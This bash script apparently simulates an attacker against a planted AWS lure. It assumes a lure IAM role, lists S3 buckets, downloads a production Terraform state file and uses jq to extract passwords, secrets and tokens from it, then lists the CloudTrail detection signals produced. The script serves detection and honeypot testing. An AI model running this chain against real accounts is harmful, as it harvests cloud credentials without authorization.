#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 1 (S3 Terraform State Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 1 — ABUSE CHAIN"
echo "  S3 Terraform State Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: infra-s3-data-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/infra-s3-data-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing all S3 buckets (s3:ListAllMyBuckets)"
# ---------------------------------------------------------------
attack "s3:ListAllMyBuckets"
aws s3 ls
BUCKET_NAME="infra-terraform-state-${ACCOUNT_ID}"
info "Target bucket identified: ${BUCKET_NAME}"

# ---------------------------------------------------------------
step "4" "Listing objects in lure bucket (s3:ListBucket)"
# ---------------------------------------------------------------
attack "s3:ListBucket → s3://${BUCKET_NAME}/"
aws s3 ls "s3://${BUCKET_NAME}/" --recursive

# ---------------------------------------------------------------
step "5" "Downloading terraform state file (s3:GetObject)"
# ---------------------------------------------------------------
OUTPUT_FILE="/tmp/terraform.tfstate"
attack "s3:GetObject → s3://${BUCKET_NAME}/env/production/terraform.tfstate"
aws s3 cp "s3://${BUCKET_NAME}/env/production/terraform.tfstate" "${OUTPUT_FILE}"
info "Downloaded to: ${OUTPUT_FILE}"

# ---------------------------------------------------------------
step "6" "Extracting secrets from state file"
# ---------------------------------------------------------------
info "Parsing terraform.tfstate for credentials..."
echo ""
echo -e "${YELLOW}--- Extracted Outputs ---${NC}"
jq '.outputs' "${OUTPUT_FILE}"
echo ""
echo -e "${YELLOW}--- Resources with Credentials ---${NC}"
jq '.resources[].instances[].attributes | select(.password != null or .secret != null or .secret_string != null or .auth_token != null)' "${OUTPUT_FILE}"

# ---------------------------------------------------------------
step "7" "Summary of extracted credentials"
# ---------------------------------------------------------------
echo ""
warn "The following credentials were extracted from the state file:"
echo ""
jq -r '.resources[] | "  [\(.type)] \(.name): \(.instances[0].attributes | keys | join(", "))"' "${OUTPUT_FILE}"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "8" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on infra-s3-data-readonly-role"
echo "  • CloudTrail: ListBuckets"
echo "  • CloudTrail: ListObjects on ${BUCKET_NAME}"
echo "  • CloudTrail: GetObject on terraform.tfstate"
echo ""
